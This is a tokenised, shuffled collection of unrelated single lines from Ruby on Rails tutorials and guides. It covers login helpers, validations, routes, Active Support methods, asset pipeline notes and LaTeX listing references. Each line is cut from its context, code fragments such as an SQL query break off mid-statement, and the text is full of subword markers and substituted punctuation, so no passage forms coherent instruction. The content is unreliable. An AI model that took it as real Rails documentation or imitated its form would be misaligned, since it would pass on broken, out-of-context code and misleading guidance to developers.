▁# ▁< name > A ar on ▁B at al ion </ name >
▁With ▁the ▁working ▁\ k ode { current \_ user } ▁method ▁in ▁Listing ~\ ref { code : current _ user }, ▁we ' re ▁now ▁in ▁a ▁position ▁to ▁make ▁changes ▁to ▁our ▁application ▁base d ▁on ▁user ▁login ▁status .
▁Client ▖ find _ by _ sql (" SELECT ▁* ▁FROM ▁clients
▁This ▁will ▁create ▁` logout _ path ` ▁and ▁` logout _ url ` ▁as ▁named ▁helpers ▁in ▁your ▁application ▖
▁A ▁nicely ▁re size d ▁image .
▁* ▁Client - side ▁validations ▁can ▁be ▁useful , ▁but ▁are ▁generally ▁un re li able ▁if ▁used ╼ ▁ al one ▖
▁This ▁method ▁is ▁only ▁useful ▁ _ after _ ▁validations ▁have ▁been ▁run , ▁because ▁it ▁only ╼ inspect s ▁the ▁errors ▁collection ▁and ▁does ▁not ▁trigger ▁validations ▁itself ▖
▁All ▁methods ▁defined ▁in ▁a ▁class ▁after ▁\ k ode { private } ▁are ▁automatically ▁hidden , ▁so ▁that
▁The ▁ answer ▁depend s ▁on ▁your ▁person al ▁learning ▁style ▁and ▁how ▁much ▁programming ▁experience ▁you ▁already ▁have .
▁We ▁can ▁verify ▁that ▁this ▁work ed ▁by ▁running ▁a ▁console ▁in ▁production :
▁in ▁Listing ~\ ref { code : signin _ form _ html } .
▁ assoc ▖ has _ many ▁: products
▁The ▁method ▁` tableize ` ▁is ▁` underscore ` ▁followed ▁by ▁` pluralize ` .
▁Date ▖ new (200 9 , ▁ 12 , ▁31)▖ months _ since (2) ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010
▁A lthough ▁our ▁use ▁of ▁\ k ode { xhr } ▁is ▁new , ▁at ▁this ▁point ▁in ▁the ▁tutorial ▁you ▁should ▁be ▁able ▁to ▁infer ▁from ▁context ▁what ▁the ▁code ▁does :
▁We ' ll ▁follow ▁Twitter ' s ▁lead ▁and ▁have ▁both ▁pages ▁require ▁user ▁login .
▁See ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ be t a 1 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁ / Users / mhartl / rails _ projects / sample _ app / config / routes ▖ rb
▁A w k ward , ▁right ?
▁( S ince ▁we ▁did n ' t ▁generate ▁it ▁at ▁the ▁command ▁line , ▁you ▁will ▁have ▁to ▁create ▁the ▁Microposts ▁controller ▁file ▁by ▁hand ▖)
▁# ▁=> ▁ActiveRecord :: RecordInvalid : ▁Validation ▁failed : ▁Name ▁can ' t ▁be ▁blank
▁This ▁is ▁because ▁the ▁default ▁behavior ▁for ▁a ▁Rails ▁action ▁is ▁to ▁render ▁the ▁corresponding ▁view , ▁but ▁there ▁is ▁not ▁( n or ▁should ▁there ▁be ) ▁a ▁view ▁template ▁corresponding ▁to ▁the ▁\ k ode { create } ▁action .
▁With ▁that , ▁we ▁can ▁run ▁the ▁local ▁web ▁server ▁in ▁a ▁separate ▁ tab ▁( Figure ~\ ref { fig : rails _ server _ new _ tab }) ▁as ▁follows
▁They ▁return ▁the ▁corresponding ▁amount ▁of ▁by te s , ▁using ▁a ▁con version ▁ factor ▁of ▁10 2 4 :
▁# ▁Change ▁needed ; ▁form _ for ▁will ▁try ▁to ▁use ▁a ▁non - ex ist ent ▁PATCH ▁route .
▁The ▁( mostly ) ▁static ▁pages ▁for ▁the ▁sample ▁app .
▁* ▁` collection ( force _ reload ▁= ▁false ) `
▁from ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission } ▁to
▁To ▁do ▁this , ▁we ▁need ▁a ▁way ▁to ▁make ▁an ▁association ▁in ▁ Factory ▁Girl .
▁` beginning _ of _ month ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ month `, ▁and ▁` end _ of _ month ` ▁is ▁alias ed ▁to ▁` at _ end _ of _ month ` .
▁Active ▁Support ▁provides ▁sever al ▁methods ▁to ▁ ea se ▁access ▁to ▁instance ▁variables .
▁* ▁Rails ▁4▖0 ▁ deprecated ▁` ActionController :: Routing ` ▁in ▁favor ▁of ▁` ActionDispatch :: Routing ` .
▁I mprov ing ▁\ k ode { from \_ users \_ followed \_ by } .
▁L oo k ing ▁the ▁Bootstrap ▁variable ▁page , ▁we ▁see ▁that ▁there ▁is ▁a ▁variable ▁for ▁light ▁gra y :
▁The ▁` build _ association ` ▁method ▁returns ▁a ▁new ▁object ▁of ▁the ▁ associated ▁type ▖
▁in ▁Listing ~\ ref { code : friendly _ forwarding _ test } .
▁In ▁this ▁example , ▁` require _ self ` ▁is ▁used ▖
▁We ' ll ▁follow ▁the ▁common ▁convention ▁of ▁redirect ing ▁to ▁the ▁new ly ▁created ▁user ' s ▁profile , ▁a lthough ▁the ▁root ▁path ▁would ▁also ▁work .
▁This ▁means ▁that ▁we ▁have ▁to ▁create ▁a ▁new ▁\ k ode { app / views / shared } ▁directory ▁using ▁\ k ode { mkdir } ▁( Table ~\ ref { table : uni x _ command _ line }) :
▁With ▁that , ▁we ▁can ▁run ▁the ▁local ▁web ▁server ▁using ▁\ k ode { rails ▁ s }, ▁which ▁is ▁a ▁shortcut ▁for ▁\ k ode { rails ▁server } :
▁ Remember ▁you ▁must ▁also ▁remove ▁any ▁ references ▁to ▁the ▁middleware ▁from ▁your ▁application ▁code , ▁for ▁example :
▁Un less ▁you ▁already ▁have ▁a ▁substan tial ▁programming ▁background , ▁there ▁is ▁no ▁shortcut ▁to ▁understanding ▁blocks ; ▁you ▁just ▁have ▁to ▁see ▁them ▁a ▁lot , ▁and ▁eventual ly ▁you ' ll ▁get ▁used ▁to ▁them
▁#### ▁select
▁Spork ▁is ▁es pecially ▁useful ▁when ▁used ▁with ▁Guard , ▁which ▁we ▁can ▁arrange ▁as ▁follows :
▁( In ▁fact , ▁you ▁can ▁just ▁type ▁\ k ode { rake } ▁by ▁itself ; ▁the ▁default ▁behavior ▁of ▁\ k ode { rake } ▁is ▁to ▁run ▁the ▁test ▁suite ▖)
▁class ▁P at i ent ▁< ▁ActiveRecord :: Base
▁S ince ▁we ▁don ' t ▁( y e t ) ▁want ▁to ▁make ▁any ▁changes ▁to ▁our ▁database , ▁we ' ll ▁start ▁the ▁console ▁in ▁a ▁\ emph { sandbox } :
▁</ head >
▁TIP : ▁This ▁option ▁should ▁be ▁used ▁only ▁if ▁you ▁don ' t ▁care ▁about ▁the ▁content ▁type ▁of ╼ the ▁response ▖
▁We ▁ still ▁need ▁a ▁way ▁to ▁list ▁all ▁our ▁articles , ▁so ▁let ' s ▁do ▁that .
▁ el s if ▁options [: counter _ cache ]
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : f _ error _ messages } ▁and ▁Listing ~\ ref { code : errors _ partial } ▁and ▁the ▁ SCSS ▁from ▁Listing ~\ ref { code : error _ messages _ css }, ▁helpful ▁error ▁messages ▁now ▁appear ▁when ▁ submitting ▁invalid ▁signup ▁information , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : signup _ error _ messages } .
▁There ▁are ▁a ▁variety ▁of ▁ways ▁to ▁customize ▁the ▁behavior ▁of ▁` render ` ▖
▁This ▁allows ▁only ▁the ▁given ▁tags ▁and ▁does ▁a ▁good ▁job , ▁even ▁again st ▁all ▁kind s ▁of ▁trick s ▁and ▁m al form ed ▁tags .
▁In ▁Listing ~\ ref { code : generating _ pages }, ▁note ▁that ▁we ▁have ▁passed ▁the ▁controller ▁name ▁as ▁ CamelCase , ▁which ▁lead s ▁to ▁the ▁creation ▁of ▁a ▁controller ▁file ▁written ▁in ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / S na k e _ case } { s na k e ▁case }, ▁so ▁that ▁a ▁controller ▁called ▁StaticPages ▁yields ▁a ▁file ▁called ▁\ k ode { static \_ pages \_ controller ▖ rb } .
▁In ▁particular , ▁\ k ode { params } ▁contains ▁a ▁nested ▁hash ▁of ▁the ▁form
▁create
▁If ▁` config ▖ assets ▖ digest ` ▁is ▁also ▁true , ▁the ▁asset ▁pipeline ▁will ▁require ▁that ╼ all ▁requests ▁for ▁assets ▁include ▁digest s .
▁Similar ly , ▁we ▁can ▁move ▁the ▁header ▁material ▁into ▁the ▁partial ▁show n ▁in ▁Listing ~\ ref { code : header _ partial } ▁and ▁insert ▁it ▁into ▁the ▁layout ▁with ▁another ▁call ▁to ▁\ k ode { render } .
▁#### # ▁The ▁`: status ` ▁Option
▁This ▁method ▁works ▁like ▁its ▁br other s , ▁` attr _ accessor ` ▁and ▁` c attr _ accessor `, ▁but ╼ provide s ▁a ▁set ter ▁and ▁get ter ▁method ▁on ▁the ▁module ▁with ▁the ▁specified ▁name ▖
▁The ▁presence ▁of ▁the ▁\ k ode { do } ▁keyword ▁indicates ▁that ▁\ k ode { form \_ for } ▁take s ▁a ▁block ▁with ▁one ▁variable , ▁which ▁we ' ve ▁called ▁\ k ode { f } ▁( for ▁`` form '') .
▁INFO : ▁As ▁a ▁rule ▁of ▁thumb ▁you ▁can ▁think ▁of ▁` camelize ` ▁as ▁the ▁ inverse ▁of ▁` underscore `, ▁though ▁there ▁are ▁cases ▁where ▁that ▁does ▁not ▁hold : ▁` " SSL Error "▖ underscore ▖ camelize ` ▁gives ▁back ▁` " S s l Error " ` ▖
▁For ▁completeness , ▁we ' ll ▁usually ▁use ▁this ▁method ▁to ▁run ▁the ▁tests ▁through ▁the ▁rest ▁of ▁the ▁tutorial .
▁At ▁this ▁point ▁the ▁tests ▁should ▁pass :
▁Then ▁implement ▁an ▁ RSS ▁feed ▁for ▁their ▁status ▁feed , ▁optional ly ▁restrict ing ▁access ▁to ▁that ▁feed ▁using ▁an ▁authentication ▁ scheme .
▁route ▁" root ▁to : ▁' people # index ' "
▁$ ▁git ▁push ▁ origin ▁my _ pull _ request ▁- f
▁This ▁is ▁es pecially ▁appropriate ▁on ▁site s ▁containing ▁ sensitive ▁information , ▁such ▁as ▁b an k ing ▁and ▁f in an cial ▁ tr ad ing ▁account s .
▁There ▁are ▁some ▁situation s ▁where ▁your ▁engine ' s ▁assets ▁are ▁not ▁required ▁by ▁the ╼ host ▁application ▖
▁Some how , ▁we ▁want ▁to ▁be ▁able ▁to ▁make ▁this ▁\ emph { variable }, ▁so ▁we ▁can ▁call
▁Thu s , ▁after ▁a ▁simple ▁require ▁like :
▁The ▁second ▁main ▁way ▁to ▁update ▁multiple ▁attributes ▁is ▁to ▁use ▁\ k ode { update \_ attributes }
▁def ▁ welcome _ email ( user , ▁email _ body )
▁| ▁PATCH / PUT ▁| ▁ / sekret / comments / : id (▖ : format ) ▁| ▁comments # update ▁| ▁comment _ path ▁|
▁We ▁check ▁if ▁there ▁are ▁any ▁errors ▁with ╼ `@ article ▖ errors ▖ any ?` , ▁and ▁in ▁that ▁case ▁we ▁show ▁a ▁list ▁of ▁all ╼ errors ▁with ▁`@ article ▖ errors ▖ full _ messages ` .
▁Client ▖ select (: name )▖ distinct
▁But ▁there ▁are ▁no ▁ quot es ▁allow ed ▁in ▁the ▁pa y load , ▁because ▁single ▁and ▁double ▁ quot es ▁have ▁already ▁been ▁used ▖
▁This ▁typical ly ▁involve s ▁ installing ▁\ emph { gem s }, ▁which ▁are ▁self - contain ed ▁package s ▁of ▁Ruby ▁code .
▁No rm ally , ▁you ▁would ▁sub class ▁` Tilt :: Template ` ▁and ╼ re implement ▁the ▁` prepare ` ▁method , ▁which ▁ initialize s ▁your ▁template , ▁and ▁the ╼` eval u ate ` ▁method , ▁which ▁returns ▁the ▁processed ▁source ▖
▁It ▁implement s ▁that ▁control ▁via ▁` assert _ valid _ keys ` .
▁This ▁means ▁that ▁instead ▁of ╼` http :// localhost :3000/ blorgh / articles `, ▁you ▁only ▁need ▁to ▁go ▁to ╼` http :// localhost :3000/ blorgh ` ▁now .
▁S ince ▁we ' ll ▁be ▁using ▁this ▁sample ▁app ▁throughout ▁the ▁rest ▁of ▁the ▁book , ▁it ' s ▁a ▁good ▁idea ▁to ▁\ href { https :// bitbucket ▖ org / repo / create } { create ▁a ▁new ▁repository ▁at ▁Bitbucket } ▁and ▁push ▁it ▁up :
▁resources ▁: comments
▁There ▁are ▁many ▁other ▁examples ▁of ▁co up l ing ▁between ▁our ▁tests ▁and ▁the ▁site ' s ▁implementation .
▁We ' ll ▁learn ▁much ▁more ▁about ▁the ▁association ▁facilit ies ▁in ▁Active ▁Record ▁in ▁Chapter ~\ ref { cha : user _ microposts } ▁and ▁Chapter ~\ ref { cha : following _ users } .
▁== ▁Create Users : ▁migrat ing ▁============= ========= ============== ================
▁A ▁note ▁about ▁tool s
▁* ▁` offset `
▁ Validations ▁Over view
▁JSON ▁is ▁a ▁JavaScript ▁data ▁format ▁used ▁by ▁many ▁Ajax ▁libraries ▖
▁It ▁is ▁the ▁ n eg ation ▁of ▁the ▁built - in ▁` include ?` :
▁Model - level ╼ validations ▁are ▁the ▁best ▁way ▁to ▁ensure ▁that ▁only ▁valid ▁data ▁is ▁saved ▁into ▁your ╼ database ▖
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / s li ce ▖ rb ` .
▁In side ▁the ▁` app ` ▁directory ▁are ▁the ▁standard ▁` assets `, ▁` controllers `, ▁` helpers `, ╼` mailers `, ▁` models ` ▁and ▁` views ` ▁directories ▁that ▁you ▁should ▁be ▁ familiar ▁with ╼ from ▁an ▁application ▖
▁now ▁= ▁ DateTime ▖ current ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁ 19 : 27 : 5 2 ▁- 0 400
▁To ▁make ▁a ▁new ▁user , ▁we ▁visit ▁the ▁\ href { http :// localhost :3000/ users / new }{\ text tt { new } } ▁page , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : demo _ new _ user _ rails _3} .
▁` ActiveRecord :: O b server ` ▁and ▁` ActionController :: Caching :: S w eep er ` ▁have ▁been ▁ extract ed ▁to ▁the ▁` rails - observers ` ▁gem ▖
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ads / : id ▁| ▁ ads # show ▁| ▁display ▁a ▁specific ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁Sprockets ▖ register _ engine ▁' ▖ bang ', ▁B an g B an g :: Template
▁T hanks ▁to ▁reader ▁N i el s ▁ de ▁R on ▁for ▁point ing ▁this ▁out .
▁in ▁Listing ~\ ref { code : post _ signup } ▁and
▁A ▁call ▁to ▁` user ▖ save ` ▁will ▁commit ▁the ▁record ▁to ▁the ▁database .
▁F ur the r more , ▁( al most ) ▁every one ▁who ▁works ▁on ▁Rails ▁is ▁a ╼ v ol un te er , ▁and ▁so ▁it ▁may ▁take ▁a ▁few ▁day s ▁for ▁you ▁to ▁get ▁your ▁first ▁feedback ▁on ╼ a ▁pull ▁request ▖ ▁ Don ' t ▁ de s p a ir !
▁Because ▁we ' ll ▁need ▁forms ▁both ▁for ▁creating ▁new ▁password ▁resets ▁\ line break ▁( Figure ~\ ref { fig : forgot _ password _ form _ mockup }) ▁and ▁for ▁updating ▁them ▁by ▁changing ▁the ▁password ▁in ▁the ▁User ▁model ▁( Figure ~\ ref { fig : reset _ password _ form _ mockup }), ▁we ▁need ▁routes ▁for ▁\ k ode { new }, ▁\ k ode { create }, ▁\ k ode { edit }, ▁and ▁\ k ode { update } .
▁where ▁we ▁need ▁to ▁fill ▁in ▁the ▁comment ▁with ▁the ▁appropriate ▁code .
▁It ▁is ▁possible ▁to ▁return ▁to ▁old ▁be ha v i our ▁and ▁disable ▁` deep _ munge ` ▁ configuring ╼ your ▁application ▁if ▁you ▁are ▁ aware ▁of ▁the ▁risk ▁and ▁know ▁how ▁to ▁handle ▁it :
▁Some ▁developers ▁in s ist ▁that ▁a ▁single ▁test ▁should n ' t ▁contain ▁multiple ▁assertions .
▁# ▁id ▁: integer ▁not ▁ null , ▁primary ▁key
▁INFO : ▁The ▁ predicate ▁for ▁strings ▁uses ▁the ▁ Uni code - aware ▁character ▁class ▁` [: space : ]` , ▁so ▁for ▁example ▁U + 20 2 9 ▁( p ar a gr a ph ▁ separator ) ▁is ▁consider ed ▁to ▁be ▁whitespace .
▁In ▁this ▁section , ▁we ' ll ▁cover ▁sever al ▁of ▁the ▁most ▁common ▁cases , ▁valid ating ▁\ emph { presence }, ▁\ emph { length }, ▁\ emph { format } ▁and ▁\ emph { uniqueness } .
▁You ▁may ▁extend ▁this ▁application ▁by ╼ generating ▁controllers , ▁models ▁or ▁views ▁from ▁within ▁the ▁directory , ▁and ▁then ▁use ╼ th o se ▁to ▁test ▁your ▁engine .
▁ Adding ▁a ▁link ▁to ▁password ▁resets .
▁* ▁Get ▁the ▁code ▁right .
▁They ▁be have ▁like ▁their ▁Ruby ▁built - in ▁` attr _ * ` ▁ counter part s , ▁except ▁they ▁name ▁the ▁under ly ing ▁instance ▁variable ▁in ▁a ▁way ▁that ▁make s ▁co ll is ion s ▁less ▁likely .
▁U nfortunately , ▁as ▁noted ▁in ▁the ▁text ▁and ▁in ▁the ▁comment ▁in ▁Listing ~\ ref { code : failed _ signin _ attempt }, ▁this ▁code ▁isn ' t ▁quite ▁right .
▁* ▁Rails ▁4▖0 ▁ deprecated ▁` ActionController :: Integration Test ` ▁in ▁favor ▁of ▁` ActionDispatch :: Integration Test ` .
▁The ▁possible ▁length ▁constraint ▁options ▁are :
▁@ account ▁= ▁@ supplier ▖ build _ account ( term s : ▁" Net ▁30 ")
▁ K now ing ▁how ▁to ▁use ▁a ▁version ▁control ▁system ▁is ▁a ▁required ▁ s kill ▁for ▁every ▁ professional - grade ▁software ▁developer .
▁check _ box _ tag ▁' accept '
▁If ▁you ▁take ▁another ▁look ▁at ▁the ▁output ▁in ▁Listing ~\ ref { code : generating _ pages }, ▁you ▁m ight ▁be ▁able ▁to ▁guess ▁the ▁correspond ence ▁between ▁actions ▁and ▁views : ▁an ▁action ▁like ▁\ k ode { home } ▁has ▁a ▁corresponding ▁view ▁called ▁\ k ode { home ▖ html ▖ erb } .
▁Thu s , ▁the ▁full ▁path ▁to ▁\ k ode { production ▖ rb } ▁is
▁That ▁page ▁defines ▁variables ▁using ▁ LESS , ▁not ▁Sass , ▁but ▁the ▁\ text tt { bootstrap - sass } ▁gem ▁provides ▁the ▁Sass ▁equivalent s .
▁config ▖ action _ mailer ▖ interceptor s ▁= ▁[" Mail In ter ce p to r "]
▁time out : ▁5 000
▁ Adding ▁a ▁helper ▁method ▁and ▁a ▁custom ▁RSpec ▁match er .
▁If ▁you ▁did n ' t ▁want ▁to ▁use ▁a ▁generator , ▁you ▁could ▁create ▁your ▁own ▁file ▁inside ▁of ╼ app / mailers , ▁just ▁make ▁sure ▁that ▁it ▁inherit s ▁from ▁` ActionMailer :: Base `:
▁If ▁you ▁want ▁to ▁pass ▁settings ▁to ▁individual ▁Rails ▁ components , ▁you ▁can ▁do ▁so ▁via ▁the ▁same ▁` config ` ▁object ▁in ▁` config / application ▖ rb `:
▁Before ▁mov ing ▁on , ▁let ' s ▁take ▁a ▁ minute ▁to ▁commit ▁the ▁changes ▁on ▁our ▁topic ▁branch ▁and ▁merge ▁them ▁into ▁the ▁master ▁branch .
▁The ▁above ▁is ▁equivalent ▁to :
▁gem ▁' sass - rails ', ▁" ~ > ▁3▖2 ▖ 3 "
▁The ▁default ▁user ▁fixtures ▖
▁TIP : ▁If ▁you ▁use ▁the ▁` select ` ▁method ▁on ▁a ▁` belongs _ to ` ▁association , ▁you ▁should ▁also ▁set ▁the ▁`: foreign _ key ` ▁option ▁to ▁guarantee ▁the ▁correct ▁results .
▁Do ╼ ▁so .
▁class ▁ Server ▁< ▁ :: Rack :: Server
▁ nd ▁%>╼ ▁ ▖╼ ▁ ▖╼ ▁ ▖╼ </ html >╼ \ end { code }╼\ end { code listing } ╼╼% ▁subsection ▁a _ test _ for _ valid _ submission ▁( end )╼╼ ▁\ section { P rofessional - grade ▁deployment } ▁% ▁( fold )╼ ▁\ label { sec : professional _ grade _ deployment }╼╼
▁Note ▁how ▁close ly ▁this ▁resembl es ▁the ▁new ▁user ▁view ▁from ▁Listing ~\ ref { code : signup _ form } ; ▁the ▁large ▁ overlap ▁suggest s ▁ factor ing ▁the ▁repeated ▁code ▁into ▁a ▁partial , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : updating _ deleting _ exercises }) .
▁A ▁CDN ▁works ▁by ▁ caching ▁content ▖
▁ Delete d ▁branch ▁modify - README ▁( w as ▁2 c 92 be f ) .
▁has _ many ▁: picture s , ▁as : ▁: image able
▁ Adding ▁\ k ode { bundler \_ stub s } ▁to ▁the ▁\ k ode { ▖ gitignore } ▁file .
▁ Content - Length : ▁ 12 656 0
▁You ▁will ▁have ▁to ▁be ▁es pecially ▁careful ▁with ▁these ▁function s ▁if ▁the ▁user ▁may ▁enter ▁the ▁whole ▁command , ▁or ▁a ▁part ▁of ▁it ▖
▁``` ruby
▁The ▁` - n ` ▁option ▁allows ▁you ▁to ▁run ▁a ▁single ▁method ▁instead ▁of ▁the ▁whole
▁Extensions ▁to ▁` Array `
▁#### ▁` Time ▖ current `
▁Here ' s ▁an ▁example :
▁\ emph { Architectur al ▁Style s ▁and ▁the ▁De sign ▁of ▁ Net work - base d ▁ Software ▁ Architectur es } .
▁self ▖ author ▁= ▁User ▖ find _ or _ create _ by ( name : ▁author _ name )
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁make ▁\ emph { sure } ▁of ▁email ▁ validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁By ▁naming ▁the ▁columns ▁in ▁this ▁way , ▁we ' ll ▁let ▁Active ▁Record ▁ figure ▁out ▁the ▁User ▁object ▁attributes ▁for ▁us .
▁In side ▁a ▁ JS - ERb ▁file , ▁Rails ▁automatically ▁provides ▁the ▁\ href { http :// jquery ▖ com /}{ jQuery } ▁JavaScript ▁helpers ▁to ▁manipulate ▁the ▁page ▁using ▁the ▁\ href { http :// www ▖ w 3 ▖ org / DOM /}{ Document ▁Object ▁Model ▁( DOM )} .
▁By ▁the ▁way , ▁previous ▁versions ▁of ▁Rails ▁used ▁\ text tt { PUT } ▁in ▁place ▁of ▁\ text tt { PATCH }, ▁and ▁Rails ~4▖0 ▁ still ▁supports ▁this ▁usage , ▁but ▁\ text tt { PATCH } ▁\ href { http :// web log ▖ rubyonrails ▖ org / 20 12 / 2 / 25 / ed ge - rails - patch - is - the - new - primary - http - method - for - update s /}{ match es ▁the ▁intend ed ▁HTTP ▁usage ▁better } ▁and ▁is ▁preferred ▁for ▁new ▁applications .
▁For ▁example , ▁if ▁we ▁submit ▁invalid ▁login ▁information ▁and ▁then ▁click ▁on ▁the ▁Home ▁page , ▁the ▁flash ▁get s ▁displayed ▁a ▁second ▁time ▁( Figure ~\ ref { fig : flash _ persistence }) .
▁The ▁reason ▁is ▁that ▁the ▁edit ▁and ▁update ▁actions ▁now ▁require ▁a ▁logged - in ▁user , ▁but ▁no ▁user ▁is ▁logged ▁in ▁inside ▁the ▁corresponding ▁tests .
▁A ▁f right en ing ly ▁large ▁upload ed ▁image .
▁Format s ▁a ▁number ▁into ▁a ▁ currency ▁string ▁( e ▖ g ▖ , ▁$ 1 3 ▖ 6 5 ) .
▁ ╼ ▁* = ▁require _ self
▁The ▁`: inverse _ of ` ▁option ▁specifie s ▁the ▁name ▁of ▁the ▁` belongs _ to ` ▁association ▁that ▁is ▁the ▁ inverse ▁of ▁this ▁association ▖
▁When ▁called ▁with ▁no ▁arguments , ▁\ k ode { User ▖ new } ▁returns ▁an ▁object ▁with ▁all ▁\ k ode { nil } ▁attributes .
▁# ▁def ▁debug ?
▁If ▁you ▁try ▁to ▁create ▁a ▁new ▁` Client ` ▁without ▁passing ▁an ▁` orders _ count `, ▁the ▁record ▁will ▁be ▁invalid ▁and ▁an ▁exception ▁will ▁be ▁raised :
▁The ▁basic s ▁of ▁what ▁we ▁cover ▁will ▁likely ▁be ▁ familiar , ▁but ▁test - driven ▁development ▁may ▁be ▁new ▁to ▁you , ▁as ▁may ▁be ▁the ▁structure d ▁REST ▁style ▁favor ed ▁by ▁Rails .
▁One ▁an no y ance ▁ associated ▁with ▁using ▁the ▁\ k ode { rake ▁test } ▁command ▁is ▁ having ▁to ▁switch ▁to ▁the ▁command ▁line ▁and ▁run ▁the ▁tests ▁by ▁hand .
▁A ▁template ▁for ▁tests ▁of ▁the ▁error ▁messages .
▁By ▁convention , ▁Rails ▁ assumes ▁that ▁the ▁column ▁used ▁to ▁hold ▁the ▁foreign ▁key ▁on ▁this ▁model ▁is ▁the ▁name ▁of ▁the ▁association ▁with ▁the ▁ suffix ▁` _ id ` ▁added ▖
▁or , ▁equivalent ly , ▁use ▁` <%= = `:
▁ years _ since
▁This ▁optional ▁section ▁describe s ▁the ▁testing ▁setup ▁used ▁in ▁the ▁\ href { http :// www ▖ railstutorial ▖ org /}{ Ruby ▁on ▁Rails ▁Tutorial ▁ screen c a st ▁series } .
▁class ▁Co nt in ent ▁< ▁ActiveRecord :: Base
▁The ▁` video _ tag ` ▁helper ▁build s ▁an ▁HTML ▁5 ▁`< video >` ▁tag ▁to ▁the ▁specified ▁file ▖
▁Ke y ▁: success ▁has ▁value ▁" It ▁work ed !"
▁" User "▖ foreign _ key ▁# ▁=> ▁" user _ id "
▁The ▁method ▁` to _ s ` ▁is ▁alias ed ▁to ▁` to _ formatted _ s ` ▖
▁" hello "▖ from (2) ▁# ▁=> ▁" ll o "
▁Code ▁examples ▁throughout ▁this ▁guide ▁will ▁refer ▁to ▁one ▁or ▁more ▁of ▁the ▁following ▁models :
▁in ▁Listing ~\ ref { code : find _ authenticate _ user } .
▁A ▁mockup ▁of ▁the ▁user ▁signup ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁Because ▁every ▁new ly ▁signed - up ▁user ▁will ▁require ▁activation , ▁we ▁should ▁assign ▁an ▁activation ▁token ▁and ▁digest ▁to ▁each ▁user ▁object ▁before ▁it ' s ▁created .
▁< b > Users </ b >
▁It ▁is ▁possible ▁to ▁open ▁up ▁and ▁modify ▁built - in ▁Ruby ▁classes .
▁* ▁Rails ▁4▖0 ▁ deprecated ▁` ActionController :: Response ` ▁in ▁favor ▁of ▁` ActionDispatch :: Response ` .
▁ ╼ ▁> > ▁Rails ▖ env ▖ development ?
▁The ▁methods ▁` beginning _ of _ year ` ▁and ▁` end _ of _ year ` ▁return ▁the ▁date s ▁for ▁the ▁beginning ▁and ▁end ▁of ▁the ▁ year :
▁> > ▁p ▁= ▁Person ▖ new
▁As ▁we ▁did ▁before , ▁we ▁need ▁to ▁add ▁the ▁` show ` ▁action ▁in ╼` app / controllers / articles _ controller ▖ rb ` ▁and ▁its ▁respective ▁view .
▁A ▁custom ▁\ k ode { Guardfile } .
▁If ▁you ▁did ▁not ▁configure ▁the ▁`: host ` ▁option ▁ global ly ▁make ▁sure ▁to ▁pass ▁it ▁to ▁the ╼ url ▁helper .
▁The ▁rule ▁is ▁that ▁if ▁you ▁do ▁not ▁explicitly ▁render ▁something ▁at ▁the ▁end ▁of ▁a ▁controller ▁action , ▁Rails ▁will ▁automatically ▁look ▁for ▁the ▁` action _ name ▖ html ▖ erb ` ▁template ▁in ▁the ▁controller ' s ▁view ▁path ▁and ▁render ▁it ▖
▁Re mov ing ▁the ▁raised ▁exception ▖
▁enable _ start t l s _ auto : ▁true ▁ }
▁De script ion ▁ List s
▁The ▁practical ly ▁blank ▁default ▁User ▁ spec .
▁To ▁do ▁this , ▁we ' ll ▁add ▁tests ▁to ▁the ▁Users ▁controller ▁test ▁to ▁complement ▁the ▁one s ▁show n ▁in ▁Listing ~\ ref { code : edit _ update _ redirect _ tests } .
▁* ▁How ▁to ▁add ▁a ▁pre - process or ▁to ▁the ▁pipeline .
▁< td > <%= ▁link _ to ▁" Show ", ▁book ▁%></ td >
▁has _ many ▁: account s
▁7 ▖ to _ param ▁# ▁=> ▁"7"
▁$ ▁bin / rails ▁generate ▁job ▁ guest s _ cleanup
▁The ▁status ▁feed ▁partial ▁def ers ▁the ▁rendering ▁to ▁the ▁micropost ▁partial ▁defined ▁in ▁Listing ~\ ref { code : micropost _ partial } :
▁This ▁uses ▁the ▁\ k ode { let !} ▁( read ▁`` let ▁ bang '') ▁method ▁in ▁place ▁of ▁\ k ode { let } ; ▁the ▁reason ▁is ▁that ▁\ k ode { let } ▁variables ▁are ▁\ emph { lazy }, ▁meaning ▁that ▁they ▁only ▁ spring ▁into ▁exist ence ▁when ▁reference d .
▁Listing ~\ ref { code : home _ view _ erb _ title } ▁is ▁our ▁first ▁example ▁of ▁ embedded ▁Ruby , ▁also ▁called ▁\ emph { ERb } .
▁Because ▁remember ing ▁users ▁requires ▁that ▁they ▁be ▁logged ▁in , ▁our ▁first ▁step ▁is ▁to ▁define ▁a ▁helper ▁to ▁log ▁users ▁in ▁inside ▁tests .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / i nclusion ▖ rb ` .
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : edit _ update _ redirect _ tests } .
▁define _ method ( method _ name , ▁& block )
▁-- ▁create _ table (: articles )
▁After ▁that , ▁a ▁line ▁for ▁the ▁resource ▁is ▁inserted ▁into ▁the ▁` config / routes ▖ rb ` ▁file ╼ for ▁the ▁engine ▖
▁( 2 ** 10 2 4 )▖ clone ▁# ▁=> ▁all o cat or ▁undefined ▁for ▁B ig n um
▁In ▁case ▁you ' re ▁curious , ▁the ▁code
▁#### ▁` prepend `
▁En queue ▁a ▁job ▁like ▁so :
